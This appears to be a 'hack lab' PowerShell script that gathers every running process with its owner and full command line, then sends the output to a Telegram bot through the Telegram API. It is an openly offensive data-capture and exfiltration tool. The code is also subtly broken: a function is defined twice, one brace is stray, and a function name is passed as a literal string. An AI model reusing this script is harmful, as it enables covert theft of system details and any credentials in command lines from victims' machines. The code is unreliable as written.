function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START CAPTURE ------------------- ELMO9AWIM "

function Get-ProcessList {
	PROCESS {
		$ProcessList = @()

		Get-CimInstance Win32_process | ForEach-Object {
			$Process = $_
			$Owner = Invoke-CimMethod -InputObject $Process -MethodName GetOwner | Select Domain, User
			
			$OwnerString = ""
			if ([String]::IsNullOrEmpty($Owner.Domain)) {
				$OwnerString = $Owner.User
			} else {
				$OwnerString = "$($Owner.Domain)\$($Owner.User)"
			}
			
			$Output = New-Object -TypeName PSObject -Property @{
				PID = $Process.ProcessId
				Name = $Process.ProcessName
				Owner = $OwnerString
				CommandLine = $Process.CommandLine
			}
			$ProcessList += $Output
			
		}

		$ProcessList | Format-Table -Wrap -AutoSize
	}
}

function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output ("{0} - {1}" -f (Get-Date), $LogMessage)
}


Function Send-Telegram {
  Param([Parameter(Mandatory=$true)][String]$Message)
  $Telegramtoken = "Your_Telegram_Token"
  $Telegramchatid = "Your_Telegram_Chat_ID"
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken)/sendMessage?chat_id=$($Telegramchatid)&text=$($Message)"} 
}

$msg = Log-Message " --- CAPTURED :";

Send-Telegram -Message $msg
Send-Telegram -Message Get-ProcessList;
